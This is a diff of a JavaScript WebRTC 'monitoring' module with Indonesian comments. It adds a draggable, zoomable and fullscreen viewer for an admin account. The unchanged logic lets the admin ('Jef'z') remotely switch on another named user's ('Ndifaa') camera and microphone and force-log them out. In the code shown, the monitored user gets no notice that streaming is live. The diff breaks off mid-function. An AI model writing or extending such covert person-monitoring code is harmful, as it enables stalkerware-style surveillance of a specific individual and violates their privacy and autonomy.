@@ -1,6 +1,6 @@
 // ================================================================
 // MONITOR.JS - WebRTC Monitoring
-// Auto fallback: kalau kamera tidak ada, pakai audio saja
+// Draggable + pinch-to-zoom + fullscreen seperti lightbox
 // ================================================================
 
 const ICE_SERVERS = {
@@ -14,28 +14,33 @@ const ICE_SERVERS = {
 const ADMIN_NAME = "Jef'z";
 const USER_NAME  = "Ndifaa";
 
-let monitorChannel  = null;
-let peerConnection  = null;
-let localStream     = null;
-let isVideoOn       = false;
-let isAudioOn       = false;
-let streamActive    = false;
-let monitorInited   = false;
-let hasCamera       = false; // apakah kamera tersedia
-let hasMic          = false; // apakah mikrofon tersedia
+let monitorChannel = null;
+let peerConnection = null;
+let localStream    = null;
+let isVideoOn      = false;
+let isAudioOn      = false;
+let streamActive   = false;
+let monitorInited  = false;
+let hasCamera      = false;
+let hasMic         = false;
+
+// Drag state
+let dragActive = false, dragStartX = 0, dragStartY = 0, dragOrigLeft = 0, dragOrigTop = 0;
+// Pinch state
+let pinchActive = false, pinchStartDist = 0, pinchStartW = 0, pinchStartH = 0;
+// Fullscreen state
+let monitorFullscreen = false;
 
 // ===== INIT =====
 async function initMonitor() {
   if (monitorInited) return;
   monitorInited = true;
   if (!currentAccount) return;
-
   if (currentAccount.name === USER_NAME) {
     await initUserSide();
   } else if (currentAccount.name === ADMIN_NAME) {
     initAdminSide();
   }
-
   listenForceLogout();
 }
 
@@ -44,260 +49,474 @@ async function initMonitor() {
 // ================================================================
 
 async function initUserSide() {
-  // Cek perangkat yang tersedia dulu
   await detectDevices();
-
-  if (!hasCamera && !hasMic) {
-    showMonitorNotice('Tidak ada kamera atau mikrofon yang terdeteksi.');
-    return;
-  }
-
-  // Coba ambil stream sesuai perangkat yang tersedia
+  if (!hasCamera && !hasMic) { showMonitorNotice('Tidak ada kamera atau mikrofon terdeteksi.'); return; }
   await requestStream();
-
-  // Listen sinyal dari admin
   listenSignals(USER_NAME, async (signal) => {
-    if (signal.type === 'start_stream') {
-      await startUserStream();
-    } else if (signal.type === 'stop_stream') {
-      stopUserStream();
-    } else if (signal.type === 'answer') {
-      await handleAnswer(signal.payload);
-    } else if (signal.type === 'ice_candidate') {
-      await handleRemoteIce(signal.payload);
-    }
+    if      (signal.type === 'start_stream')  await startUserStream();
+    else if (signal.type === 'stop_stream')   stopUserStream();
+    else if (signal.type === 'answer')        await handleAnswer(signal.payload);
+    else if (signal.type === 'ice_candidate') await handleRemoteIce(signal.payload);
   });
 }
 
-// Deteksi perangkat yang tersedia
 async function detectDevices() {
   try {
     const devices = await navigator.mediaDevices.enumerateDevices();
     hasCamera = devices.some(d => d.kind === 'videoinput');
     hasMic    = devices.some(d => d.kind === 'audioinput');
-    console.log('[Monitor] Camera:', hasCamera, '| Mic:', hasMic);
-  } catch (e) {
-    console.error('[Monitor] detectDevices error:', e);
-  }
+  } catch (e) {}
 }
 
-// Minta stream sesuai perangkat tersedia
 async function requestStream() {
-  // Coba video + audio dulu
   if (hasCamera && hasMic) {
     try {
       localStream = await navigator.mediaDevices.getUserMedia({
-        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
-        audio: { echoCancellation: true, noiseSuppression: true }
+        video: { width:{ideal:640}, height:{ideal:480}, facingMode:'user' },
+        audio: { echoCancellation:true, noiseSuppression:true }
       });
-      console.log('[Monitor] Stream: video + audio OK');
       return;
-    } catch (e) {
-      console.warn('[Monitor] video+audio gagal, coba audio saja:', e.message);
-    }
+    } catch (e) {}
   }
-
-  // Fallback: audio saja
   if (hasMic) {
     try {
-      localStream = await navigator.mediaDevices.getUserMedia({
-        video: false,
-        audio: { echoCancellation: true, noiseSuppression: true }
-      });
-      hasCamera = false; // confirm tidak ada video
-      console.log('[Monitor] Stream: audio only OK');
-      return;
-    } catch (e) {
-      console.warn('[Monitor] audio saja juga gagal:', e.message);
-    }
+      localStream = await navigator.mediaDevices.getUserMedia({ video:false, audio:{ echoCancellation:true, noiseSuppression:true } });
+      hasCamera = false; return;
+    } catch (e) {}
   }
-
-  // Fallback: video saja (jarang tapi mungkin)
   if (hasCamera) {
     try {
-      localStream = await navigator.mediaDevices.getUserMedia({
-        video: { width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
-      });
-      hasMic = false;
-      console.log('[Monitor] Stream: video only OK');
-      return;
-    } catch (e) {
-      console.warn('[Monitor] video saja gagal:', e.message);
-    }
+      localStream = await navigator.mediaDevices.getUserMedia({ video:{ width:{ideal:640}, height:{ideal:480} }, audio:false });
+      hasMic = false; return;
+    } catch (e) {}
   }
-
-  // Semua gagal
-  showMonitorNotice('Gagal mengakses kamera/mikrofon. Periksa izin di Settings browser.');
+  showMonitorNotice('Gagal mengakses kamera/mikrofon.');
 }
 
 async function startUserStream() {
-  if (!localStream) {
-    // Coba request lagi kalau belum ada
-    await requestStream();
-    if (!localStream) return;
-  }
-
-  // Tutup koneksi lama kalau ada
+  if (!localStream) { await requestStream(); if (!localStream) return; }
   if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
-
   peerConnection = new RTCPeerConnection(ICE_SERVERS);
-
-  // Tambahkan semua track yang tersedia
-  localStream.getTracks().forEach(track => {
-    peerConnection.addTrack(track, localStream);
-  });
-
-  peerConnection.onicecandidate = async (event) => {
-    if (event.candidate) {
-      await sendSignal({ type: 'ice_candidate', from: USER_NAME, to: ADMIN_NAME, payload: JSON.stringify(event.candidate) });
-    }
+  localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+  peerConnection.onicecandidate = async (e) => {
+    if (e.candidate) await sendSignal({ type:'ice_candidate', from:USER_NAME, to:ADMIN_NAME, payload:JSON.stringify(e.candidate) });
   };
-
-  peerConnection.onconnectionstatechange = () => {
-    console.log('[Monitor] Connection state:', peerConnection.connectionState);
-  };
-
-  // Kirim info apakah ada video atau tidak (biar admin tahu)
   const offer = await peerConnection.createOffer();
   await peerConnection.setLocalDescription(offer);
-
-  await sendSignal({
-    type:    'offer',
-    from:    USER_NAME,
-    to:      ADMIN_NAME,
-    payload: JSON.stringify({ offer, hasVideo: hasCamera, hasAudio: hasMic })
-  });
-
-  console.log('[Monitor] Offer dikirim ke admin');
+  await sendSignal({ type:'offer', from:USER_NAME, to:ADMIN_NAME, payload:JSON.stringify({ offer, hasVideo:hasCamera, hasAudio:hasMic }) });
 }
 
 async function handleAnswer(answerPayload) {
   if (!peerConnection) return;
   try {
     const parsed = JSON.parse(answerPayload);
-    const answer = parsed.answer || parsed; // support format lama
+    const answer = parsed.answer || parsed;
     await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-    console.log('[Monitor] Answer diterima, koneksi tersambung');
-  } catch (e) {
-    console.error('[Monitor] handleAnswer error:', e);
-  }
+  } catch (e) {}
 }
 
 function stopUserStream() {
   if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
-  console.log('[Monitor] Stream dihentikan');
 }
 
 // ================================================================
-// SISI ADMIN (JEF'Z)
+// SISI ADMIN
 // ================================================================
 
 function initAdminSide() {
   renderAdminControls();
-
+  createMonitorView();
   listenSignals(ADMIN_NAME, async (signal) => {
-    if (signal.type === 'offer') {
-      await handleOffer(signal.payload);
-    } else if (signal.type === 'ice_candidate') {
-      await handleRemoteIce(signal.payload);
-    }
+    if      (signal.type === 'offer')         await handleOffer(signal.payload);
+    else if (signal.type === 'ice_candidate') await handleRemoteIce(signal.payload);
   });
 }
 
 function renderAdminControls() {
   const topbarRight = document.querySelector('.topbar-right');
   if (!topbarRight || document.getElementById('monitorControls')) return;
-
   const wrap = document.createElement('div');
   wrap.id = 'monitorControls';
   wrap.style.cssText = 'display:flex;gap:4px;align-items:center;';
 
-  // Tombol Video
   const videoBtn = document.createElement('button');
-  videoBtn.id = 'monitorVideoBtn';
-  videoBtn.className = 'tb-btn monitor-btn';
-  videoBtn.title = 'Monitor Video (ON/OFF)';
-  videoBtn.innerHTML = '📵';
-  videoBtn.onclick = toggleMonitorVideo;
+  videoBtn.id = 'monitorVideoBtn'; videoBtn.className = 'tb-btn monitor-btn';
+  videoBtn.title = 'Monitor Video'; videoBtn.innerHTML = '📵'; videoBtn.onclick = toggleMonitorVideo;
   wrap.appendChild(videoBtn);
 
-  // Tombol Audio
   const audioBtn = document.createElement('button');
-  audioBtn.id = 'monitorAudioBtn';
-  audioBtn.className = 'tb-btn monitor-btn';
-  audioBtn.title = 'Monitor Audio (ON/OFF)';
-  audioBtn.innerHTML = '🔇';
-  audioBtn.onclick = toggleMonitorAudio;
+  audioBtn.id = 'monitorAudioBtn'; audioBtn.className = 'tb-btn monitor-btn';
+  audioBtn.title = 'Monitor Audio'; audioBtn.innerHTML = '🔇'; audioBtn.onclick = toggleMonitorAudio;
   wrap.appendChild(audioBtn);
 
-  // Tombol Force Logout
   const logoutBtn = document.createElement('button');
-  logoutBtn.id = 'forceLogoutBtn';
-  logoutBtn.className = 'tb-btn monitor-btn';
-  logoutBtn.title = 'Force Logout Ndifaa';
-  logoutBtn.innerHTML = '⏏';
-  logoutBtn.style.color = 'var(--danger)';
-  logoutBtn.onclick = forceLogoutUser;
+  logoutBtn.id = 'forceLogoutBtn'; logoutBtn.className = 'tb-btn monitor-btn';
+  logoutBtn.title = 'Force Logout Ndifaa'; logoutBtn.innerHTML = '⏏';
+  logoutBtn.style.color = 'var(--danger)'; logoutBtn.onclick = forceLogoutUser;
   wrap.appendChild(logoutBtn);
 
-  // Insert sebelum theme button
   const themeBtn = topbarRight.querySelector('.theme-btn');
-  if (themeBtn) topbarRight.insertBefore(wrap, themeBtn);
-  else topbarRight.prepend(wrap);
-
-  // Monitor view (floating video/audio indicator)
-  const monitorView = document.createElement('div');
-  monitorView.id = 'monitorView';
-  monitorView.style.cssText = [
-    'display:none',
-    'position:fixed',
-    'bottom:calc(var(--nav-h) + 12px)',
-    'right:12px',
-    'z-index:500',
-    'border-radius:16px',
-    'overflow:hidden',
-    'box-shadow:0 8px 32px rgba(0,0,0,0.4)',
-    'border:2px solid rgba(255,255,255,0.2)',
-    'background:#000',
-  ].join(';');
-
-  monitorView.innerHTML =
-    // Video element (tersembunyi kalau audio only)
-    '<video id="monitorVideo" autoplay playsinline muted style="width:200px;height:150px;object-fit:cover;display:block;background:#000;"></video>' +
-    // Audio only indicator
-    '<div id="audioOnlyBadge" style="display:none;width:200px;height:80px;background:linear-gradient(135deg,#1c1c1e,#2c2c2e);align-items:center;justify-content:center;flex-direction:column;gap:8px;">' +
-      '<div style="font-size:32px;">🎙</div>' +
-      '<div style="font-size:11px;color:#ffffffcc;font-weight:600;">Audio Only</div>' +
-    '</div>' +
-    // Live badge
-    '<div style="position:absolute;top:6px;left:8px;font-size:10px;font-weight:700;color:white;text-shadow:0 1px 4px rgba(0,0,0,0.8);background:rgba(255,59,48,0.9);padding:2px 6px;border-radius:6px;">● LIVE</div>' +
-    // Tombol tutup
-    '<button onclick="hideMonitorView()" style="position:absolute;top:4px;right:4px;background:rgba(0,0,0,0.6);border:none;color:white;border-radius:50%;width:24px;height:24px;font-size:12px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1;">✕</button>';
-
-  document.body.appendChild(monitorView);
+  if (themeBtn) topbarRight.insertBefore(wrap, themeBtn); else topbarRight.prepend(wrap);
 }
 
+// ===== BUAT MONITOR VIEW (FLOATING) =====
+function createMonitorView() {
+  if (document.getElementById('monitorFloating')) return;
+
+  // Floating window
+  const floating = document.createElement('div');
+  floating.id = 'monitorFloating';
+  floating.style.cssText = [
+    'display:none',
+    'position:fixed',
+    'bottom:calc(var(--nav-h) + 14px)',
+    'right:14px',
+    'width:200px',
+    'z-index:600',
+    'border-radius:16px',
+    'overflow:hidden',
+    'box-shadow:0 8px 40px rgba(0,0,0,0.5)',
+    'border:1.5px solid rgba(255,255,255,0.18)',
+    'background:#000',
+    'touch-action:none',
+    'cursor:grab',
+    'transition:box-shadow 0.2s',
+  ].join(';');
+
+  // Header bar (untuk drag)
+  const header = document.createElement('div');
+  header.id = 'monitorHeader';
+  header.style.cssText = [
+    'display:flex',
+    'align-items:center',
+    'justify-content:space-between',
+    'padding:6px 8px',
+    'background:linear-gradient(135deg,rgba(0,0,0,0.7),rgba(20,20,20,0.9))',
+    'backdrop-filter:blur(8px)',
+    'cursor:grab',
+    'user-select:none',
+    '-webkit-user-select:none',
+  ].join(';');
+
+  header.innerHTML =
+    '<div style="display:flex;align-items:center;gap:6px;">' +
+      '<div style="width:7px;height:7px;border-radius:50%;background:#ff453a;animation:livePulse 1.5s ease infinite;"></div>' +
+      '<span style="font-size:10px;font-weight:700;color:white;letter-spacing:0.5px;">LIVE</span>' +
+    '</div>' +
+    '<div style="display:flex;gap:4px;">' +
+      '<button id="monitorExpandBtn" onclick="openMonitorFullscreen()" style="background:rgba(255,255,255,0.15);border:none;color:white;border-radius:6px;width:22px;height:22px;font-size:11px;cursor:pointer;display:flex;align-items:center;justify-content:center;" title="Fullscreen">⛶</button>' +
+      '<button onclick="stopAndHideMonitor()" style="background:rgba(255,59,48,0.7);border:none;color:white;border-radius:6px;width:22px;height:22px;font-size:11px;cursor:pointer;display:flex;align-items:center;justify-content:center;" title="Tutup">✕</button>' +
+    '</div>';
+  floating.appendChild(header);
+
+  // Video element
+  const vid = document.createElement('video');
+  vid.id = 'monitorVideo'; vid.autoplay = true; vid.playsInline = true; vid.muted = true;
+  vid.style.cssText = 'width:100%;display:block;background:#000;aspect-ratio:4/3;object-fit:cover;';
+  vid.ondblclick = openMonitorFullscreen;
+  floating.appendChild(vid);
+
+  // Audio only badge
+  const badge = document.createElement('div');
+  badge.id = 'audioOnlyBadge';
+  badge.style.cssText = 'display:none;width:100%;height:120px;background:linear-gradient(135deg,#1c1c1e,#2c2c2e);align-items:center;justify-content:center;flex-direction:column;gap:8px;';
+  badge.innerHTML = '<div style="font-size:40px;">🎙</div><div style="font-size:11px;color:rgba(255,255,255,0.7);font-weight:600;">Audio Only</div>';
+  floating.appendChild(badge);
+
+  // Resize handle (pojok kanan bawah)
+  const resizeHandle = document.createElement('div');
+  resizeHandle.id = 'monitorResizeHandle';
+  resizeHandle.style.cssText = 'position:absolute;bottom:0;right:0;width:18px;height:18px;cursor:nwse-resize;display:flex;align-items:center;justify-content:center;';
+  resizeHandle.innerHTML = '<svg width="10" height="10" viewBox="0 0 10 10"><path d="M9 1L1 9M5 1L1 5M9 5L5 9" stroke="rgba(255,255,255,0.4)" stroke-width="1.5" stroke-linecap="round"/></svg>';
+  floating.appendChild(resizeHandle);
+
+  document.body.appendChild(floating);
+
+  // Init drag & resize
+  initDrag(floating, header);
+  initResize(floating, resizeHandle);
+  initPinchZoom(floating);
+}
+
+// ===== DRAG =====
+function initDrag(el, handle) {
+  // Mouse drag
+  handle.addEventListener('mousedown', (e) => {
+    if (e.target.tagName === 'BUTTON' || e.target.closest('button')) return;
+    dragActive = true;
+    dragStartX = e.clientX;
+    dragStartY = e.clientY;
+    const rect = el.getBoundingClientRect();
+    dragOrigLeft = rect.left;
+    dragOrigTop  = rect.top;
+    el.style.cursor = 'grabbing';
+    el.style.transition = 'none';
+    e.preventDefault();
+  });
+
+  document.addEventListener('mousemove', (e) => {
+    if (!dragActive) return;
+    const dx = e.clientX - dragStartX;
+    const dy = e.clientY - dragStartY;
+    const newLeft = Math.max(0, Math.min(window.innerWidth  - el.offsetWidth,  dragOrigLeft + dx));
+    const newTop  = Math.max(0, Math.min(window.innerHeight - el.offsetHeight, dragOrigTop  + dy));
+    el.style.left   = newLeft + 'px';
+    el.style.top    = newTop  + 'px';
+    el.style.right  = 'auto';
+    el.style.bottom = 'auto';
+  });
+
+  document.addEventListener('mouseup', () => {
+    if (!dragActive) return;
+    dragActive = false;
+    el.style.cursor = 'grab';
+    el.style.transition = 'box-shadow 0.2s';
+  });
+
+  // Touch drag
+  let touchId = null;
+  handle.addEventListener('touchstart', (e) => {
+    if (e.target.tagName === 'BUTTON' || e.target.closest('button')) return;
+    if (e.touches.length !== 1) return;
+    const t = e.touches[0];
+    touchId    = t.identifier;
+    dragActive = true;
+    dragStartX = t.clientX;
+    dragStartY = t.clientY;
+    const rect = el.getBoundingClientRect();
+    dragOrigLeft = rect.left;
+    dragOrigTop  = rect.top;
+    el.style.transition = 'none';
+  }, { passive: true });
+
+  handle.addEventListener('touchmove', (e) => {
+    if (!dragActive) return;
+    const t = Array.from(e.touches).find(t => t.identifier === touchId);
+    if (!t) return;
+    const dx = t.clientX - dragStartX;
+    const dy = t.clientY - dragStartY;
+    const newLeft = Math.max(0, Math.min(window.innerWidth  - el.offsetWidth,  dragOrigLeft + dx));
+    const newTop  = Math.max(0, Math.min(window.innerHeight - el.offsetHeight, dragOrigTop  + dy));
+    el.style.left   = newLeft + 'px';
+    el.style.top    = newTop  + 'px';
+    el.style.right  = 'auto';
+    el.style.bottom = 'auto';
+    if (e.cancelable) e.preventDefault();
+  }, { passive: false });
+
+  handle.addEventListener('touchend', () => { dragActive = false; el.style.transition = 'box-shadow 0.2s'; });
+}
+
+// ===== RESIZE (mouse) =====
+function initResize(el, handle) {
+  let resizing = false, startX = 0, startY = 0, startW = 0, startH = 0;
+
+  handle.addEventListener('mousedown', (e) => {
+    resizing = true; startX = e.clientX; startY = e.clientY;
+    startW = el.offsetWidth; startH = el.offsetHeight;
+    e.preventDefault(); e.stopPropagation();
+  });
+
+  document.addEventListener('mousemove', (e) => {
+    if (!resizing) return;
+    const newW = Math.max(160, Math.min(480, startW + (e.clientX - startX)));
+    const newH = Math.max(120, Math.min(400, startH + (e.clientY - startY)));
+    el.style.width = newW + 'px';
+    // Height ikut aspect ratio video
+  });
+
+  document.addEventListener('mouseup', () => { resizing = false; });
+
+  // Touch resize
+  handle.addEventListener('touchstart', (e) => {
+    if (e.touches.length !== 1) return;
+    resizing = true; startX = e.touches[0].clientX; startY = e.touches[0].clientY;
+    startW = el.offsetWidth; startH = el.offsetHeight;
+    e.stopPropagation();
+  }, { passive: true });
+
+  handle.addEventListener('touchmove', (e) => {
+    if (!resizing || e.touches.length !== 1) return;
+    const newW = Math.max(160, Math.min(480, startW + (e.touches[0].clientX - startX)));
+    el.style.width = newW + 'px';
+    if (e.cancelable) e.preventDefault();
+  }, { passive: false });
+
+  handle.addEventListener('touchend', () => { resizing = false; });
+}
+
+// ===== PINCH TO ZOOM =====
+function initPinchZoom(el) {
+  el.addEventListener('touchstart', (e) => {
+    if (e.touches.length !== 2) return;
+    pinchActive   = true;
+    pinchStartDist = getPinchDist(e.touches);
+    pinchStartW    = el.offsetWidth;
+  }, { passive: true });
+
+  el.addEventListener('touchmove', (e) => {
+    if (!pinchActive || e.touches.length !== 2) return;
+    const dist = getPinchDist(e.touches);
+    const scale = dist / pinchStartDist;
+    const newW  = Math.max(160, Math.min(480, pinchStartW * scale));
+    el.style.width = newW + 'px';
+    if (e.cancelable) e.preventDefault();
+  }, { passive: false });
+
+  el.addEventListener('touchend', () => { pinchActive = false; });
+}
+
+function getPinchDist(touches) {
+  const dx = touches[0].clientX - touches[1].clientX;
+  const dy = touches[0].clientY - touches[1].clientY;
+  return Math.sqrt(dx * dx + dy * dy);
+}
+
+// ===== FULLSCREEN (seperti lightbox) =====
+function openMonitorFullscreen() {
+  if (monitorFullscreen) return;
+  monitorFullscreen = true;
+
+  // Buat overlay seperti lightbox
+  const overlay = document.createElement('div');
+  overlay.id = 'monitorFullscreenOverlay';
+  overlay.style.cssText = [
+    'position:fixed', 'inset:0', 'z-index:9100',
+    'display:flex', 'align-items:center', 'justify-content:center',
+    'background:rgba(0,0,0,0.88)',
+    'backdrop-filter:blur(32px) saturate(140%)',
+    '-webkit-backdrop-filter:blur(32px) saturate(140%)',
+    'animation:lbFadeIn 0.22s ease',
+  ].join(';');
+
+  // Card media (seperti lightbox-media-wrap)
+  const card = document.createElement('div');
+  card.style.cssText = [
+    'position:relative',
+    'z-index:5',
+    'display:flex',
+    'align-items:center',
+    'justify-content:center',
+    'width:min(92vw,720px)',
+    'max-height:85vh',
+    'background:rgba(255,255,255,0.06)',
+    'backdrop-filter:blur(16px) saturate(150%)',
+    '-webkit-backdrop-filter:blur(16px) saturate(150%)',
+    'border:1px solid rgba(255,255,255,0.15)',
+    'border-radius:22px',
+    'box-shadow:0 0 0 1px rgba(255,255,255,0.06) inset,0 24px 80px rgba(0,0,0,0.5)',
+    'overflow:hidden',
+    'animation:lbCardIn 0.28s cubic-bezier(0.34,1.15,0.64,1)',
+  ].join(';');
+
+  // Clone video stream ke fullscreen
+  const vid = document.getElementById('monitorVideo');
+  const fsVid = document.createElement('video');
+  fsVid.id = 'monitorFsVideo';
+  fsVid.autoplay = true; fsVid.playsInline = true; fsVid.muted = !isAudioOn;
+  fsVid.style.cssText = 'width:100%;max-height:80vh;object-fit:contain;display:block;';
+  if (vid && vid.srcObject) fsVid.srcObject = vid.srcObject;
+
+  // Audio only badge untuk fullscreen
+  const badge = document.createElement('div');
+  badge.id = 'fsBadge';
+  const hasVid = vid && vid.srcObject && vid.srcObject.getVideoTracks().length > 0;
+  badge.style.cssText = 'display:' + (hasVid ? 'none' : 'flex') + ';width:100%;height:300px;align-items:center;justify-content:center;flex-direction:column;gap:12px;';
+  badge.innerHTML = '<div style="font-size:64px;">🎙</div><div style="font-size:16px;color:rgba(255,255,255,0.7);font-weight:600;">Audio Only - Sedang Live</div>';
+  if (hasVid) { fsVid.style.display = 'block'; badge.style.display = 'none'; } else { fsVid.style.display = 'none'; }
+
+  card.appendChild(fsVid);
+  card.appendChild(badge);
+
+  // Live badge
+  const liveBadge = document.createElement('div');
+  liveBadge.style.cssText = 'position:absolute;top:14px;left:14px;display:flex;align-items:center;gap:6px;background:rgba(255,59,48,0.85);padding:4px 10px;border-radius:10px;';
+  liveBadge.innerHTML = '<div style="width:7px;height:7px;border-radius:50%;background:white;animation:livePulse 1.5s ease infinite;"></div><span style="font-size:11px;font-weight:700;color:white;letter-spacing:0.5px;">LIVE</span>';
+  card.appendChild(liveBadge);
+
+  // Tombol tutup
+  const closeBtn = document.createElement('button');
+  closeBtn.style.cssText = 'position:absolute;top:14px;right:14px;width:36px;height:36px;border-radius:50%;border:none;background:rgba(255,255,255,0.18);border:1px solid rgba(255,255,255,0.25);color:white;cursor:pointer;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(12px);font-size:16px;';
+  closeBtn.innerHTML = '✕';
+  closeBtn.onclick = closeMonitorFullscreen;
+  card.appendChild(closeBtn);
+
+  // Tombol mute/unmute di fullscreen
+  const muteBtn = document.createElement('button');
+  muteBtn.style.cssText = 'position:absolute;bottom:14px;right:14px;width:40px;height:40px;border-radius:50%;border:none;background:rgba(255,255,255,0.18);border:1px solid rgba(255,255,255,0.25);color:white;cursor:pointer;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(12px);font-size:20px;';
+  muteBtn.innerHTML = isAudioOn ? '🔊' : '🔇';
+  muteBtn.onclick = () => {
+    isAudioOn = !isAudioOn;
+    fsVid.muted = !isAudioOn;
+    const mainVid = document.getElementById('monitorVideo');
+    if (mainVid) mainVid.muted = !isAudioOn;
+    const audioBtn = document.getElementById('monitorAudioBtn');
+    if (audioBtn) { audioBtn.innerHTML = isAudioOn ? '🔊' : '🔇'; audioBtn.style.color = isAudioOn ? '#34c759' : ''; }
+    muteBtn.innerHTML = isAudioOn ? '🔊' : '🔇';
+  };
+  card.appendChild(muteBtn);
+
+  overlay.appendChild(card);
+
+  // Tap overlay untuk tutup
+  overlay.addEventListener('click', (e) => { if (e.target === overlay) closeMonitorFullscreen(); });
+
+  // Swipe down untuk tutup (mobile)
+  let swipeStartY = 0;
+  overlay.addEventListener('touchstart', (e) => { swipeStartY = e.touches[0].clientY; }, { passive: true });
+  overlay.addEventListener('touchend', (e) => {
+    const dy = e.changedTouches[0].clientY - swipeStartY;
+    if (dy > 80) closeMonitorFullscreen();
+  });
+
+  document.body.appendChild(overlay);
+  document.body.style.overflow = 'hidden';
+}
+
+function closeMonitorFullscreen() {
+  monitorFullscreen = false;
+  const overlay = document.getElementById('monitorFullscreenOverlay');
+  if (overlay) {
+    overlay.style.animation = 'overlayOut 0.18s ease forwards';
+    setTimeout(() => { if (overlay.parentNode) overlay.remove(); }, 180);
+  }
+  document.body.style.overflow = '';
+}
+
+// ===== STOP & HIDE MONITOR =====
+function stopAndHideMonitor() {
+  stopAdminStream();
+}
+
+function showMonitorFloating() {
+  const el = document.getElementById('monitorFloating');
+  if (el) {
+    el.style.display = 'block';
+    el.style.animation = 'monitorIn 0.3s cubic-bezier(0.34,1.56,0.64,1)';
+  }
+}
+
+function hideMonitorFloating() {
+  const el = document.getElementById('monitorFloating');
+  if (el) el.style.display = 'none';
+}
+
+// ===== TOGGLE CONTROLS =====
 async function toggleMonitorVideo() {
   const btn = document.getElementById('monitorVideoBtn');
-
   if (!isVideoOn && !streamActive) {
-    // Mulai monitoring
     isVideoOn = true;
-    btn.innerHTML = '📹';
-    btn.style.color = '#34c759';
-    await sendSignal({ type: 'start_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
+    btn.innerHTML = '📹'; btn.style.color = '#34c759';
+    await sendSignal({ type:'start_stream', from:ADMIN_NAME, to:USER_NAME, payload:'{}' });
     streamActive = true;
     toast('Monitoring dimulai...');
-  } else if (isVideoOn) {
-    // Stop monitoring
+  } else if (isVideoOn || streamActive) {
     isVideoOn = false;
-    btn.innerHTML = '📵';
-    btn.style.color = '';
+    btn.innerHTML = '📵'; btn.style.color = '';
     isAudioOn = false;
     const audioBtn = document.getElementById('monitorAudioBtn');
     if (audioBtn) { audioBtn.innerHTML = '🔇'; audioBtn.style.color = ''; }
-    await sendSignal({ type: 'stop_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
+    await sendSignal({ type:'stop_stream', from:ADMIN_NAME, to:USER_NAME, payload:'{}' });
     stopAdminStream();
   }
 }
@@ -305,138 +524,95 @@ async function toggleMonitorVideo() {
 async function toggleMonitorAudio() {
   const btn = document.getElementById('monitorAudioBtn');
   const vid = document.getElementById('monitorVideo');
-
+  const fsVid = document.getElementById('monitorFsVideo');
   if (!isAudioOn) {
     isAudioOn = true;
-    btn.innerHTML = '🔊';
-    btn.style.color = '#34c759';
+    btn.innerHTML = '🔊'; btn.style.color = '#34c759';
     if (vid) vid.muted = false;
-
-    // Kalau stream belum aktif, mulai dulu
+    if (fsVid) fsVid.muted = false;
     if (!streamActive) {
       isVideoOn = true;
       const videoBtn = document.getElementById('monitorVideoBtn');
       if (videoBtn) { videoBtn.innerHTML = '📹'; videoBtn.style.color = '#34c759'; }
-      await sendSignal({ type: 'start_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
+      await sendSignal({ type:'start_stream', from:ADMIN_NAME, to:USER_NAME, payload:'{}' });
       streamActive = true;
       toast('Audio monitoring aktif...');
-    } else {
-      toast('Audio ON');
-    }
+    } else { toast('Audio ON'); }
   } else {
     isAudioOn = false;
-    btn.innerHTML = '🔇';
-    btn.style.color = '';
+    btn.innerHTML = '🔇'; btn.style.color = '';
     if (vid) vid.muted = true;
+    if (fsVid) fsVid.muted = true;
     toast('Audio muted');
   }
 }
 
+// ===== HANDLE OFFER (ADMIN) =====
 async function handleOffer(offerPayload) {
   if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
-
   peerConnection = new RTCPeerConnection(ICE_SERVERS);
 
-  peerConnection.onicecandidate = async (event) => {
-    if (event.candidate) {
-      await sendSignal({ type: 'ice_candidate', from: ADMIN_NAME, to: USER_NAME, payload: JSON.stringify(event.candidate) });
-    }
+  peerConnection.onicecandidate = async (e) => {
+    if (e.candidate) await sendSignal({ type:'ice_candidate', from:ADMIN_NAME, to:USER_NAME, payload:JSON.stringify(e.candidate) });
   };
 
   peerConnection.onconnectionstatechange = () => {
-    console.log('[Monitor] Admin connection state:', peerConnection.connectionState);
-    if (peerConnection.connectionState === 'failed') {
-      toast('Koneksi monitor gagal, coba lagi', false);
-      stopAdminStream();
+    if (peerConnection && peerConnection.connectionState === 'failed') {
+      toast('Koneksi monitor gagal', false); stopAdminStream();
     }
   };
 
-  // Terima stream dari Ndifaa
   peerConnection.ontrack = (event) => {
-    console.log('[Monitor] Track diterima:', event.track.kind);
     const vid   = document.getElementById('monitorVideo');
-    const view  = document.getElementById('monitorView');
     const badge = document.getElementById('audioOnlyBadge');
-
+    const view  = document.getElementById('monitorFloating');
     if (!vid || !view) return;
 
-    if (vid.srcObject !== event.streams[0]) {
-      vid.srcObject = event.streams[0];
-    }
+    if (vid.srcObject !== event.streams[0]) vid.srcObject = event.streams[0];
     vid.muted = !isAudioOn;
 
-    // Cek apakah ada video track
-    const hasVideoTrack = event.streams[0].getVideoTracks().length > 0;
+    // Sync ke fullscreen jika sedang terbuka
+    const fsVid = document.getElementById('monitorFsVideo');
+    if (fsVid && fsVid.srcObject !== event.streams[0]) { fsVid.srcObject = event.streams[0]; fsVid.muted = !isAudioOn; }
 
+    const hasVideoTrack = event.streams[0].getVideoTracks().length > 0;
     if (hasVideoTrack) {
-      // Ada video
       vid.style.display = 'block';
       if (badge) badge.style.display = 'none';
-      view.style.width = '';
     } else {
-      // Audio only — tampilkan badge
       vid.style.display = 'none';
-      if (badge) { badge.style.display = 'flex'; }
-      view.style.width = '200px';
+      if (badge) badge.style.cssText = badge.style.cssText.replace('display:none','display:flex');
     }
 
-    view.style.display = 'block';
+    showMonitorFloating();
     toast('Monitor tersambung ✓');
   };
 
-  // Parse payload
   let offer, hasVideo = true, hasAudio = true;
   try {
     const parsed = JSON.parse(offerPayload);
-    if (parsed.offer) {
-      offer    = parsed.offer;
-      hasVideo = parsed.hasVideo !== undefined ? parsed.hasVideo : true;
-      hasAudio = parsed.hasAudio !== undefined ? parsed.hasAudio : true;
